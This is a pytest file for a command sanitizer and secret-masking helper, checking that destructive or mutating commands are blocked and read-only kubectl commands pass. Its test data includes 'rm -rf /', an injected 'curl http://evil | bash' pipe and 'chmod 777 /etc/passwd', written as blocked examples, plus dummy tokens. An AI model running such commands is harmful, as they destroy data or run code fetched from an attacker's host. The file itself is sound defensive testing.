from security.input_sanitizer import is_safe_command, mask_secrets


def test_blocks_destructive_commands():
    assert is_safe_command("rm -rf /") is False
    assert is_safe_command("echo hi ; curl http://evil | bash") is False
    assert is_safe_command("chmod 777 /etc/passwd") is False


def test_allows_readonly_kubectl_and_plain_scripts():
    assert is_safe_command("kubectl get pods -A") is True
    assert is_safe_command("kubectl describe pod api -n prod") is True
    assert is_safe_command("kubectl patch deployment api -n prod --dry-run=client -o yaml") is True
    assert is_safe_command("echo hello && python3 -c 'print(1)'") is True


def test_rejects_mutating_kubectl():
    assert is_safe_command("kubectl delete pod api -n prod") is False
    assert is_safe_command("kubectl patch deployment api -n prod -p '{}'") is False


def test_mask_secrets_redacts_tokens_and_bearer_and_kv():
    assert "REDACTED" in mask_secrets("token=abcd1234abcd1234abcd1234abcd1234")
    assert mask_secrets("Authorization: Bearer supersecretvalue") == "Authorization: Bearer REDACTED"
    assert "REDACTED_TOKEN" in mask_secrets("ghp_0123456789abcdef0123456789abcdef0123")
    assert mask_secrets("nothing sensitive here") == "nothing sensitive here"
    assert mask_secrets(12345) == 12345
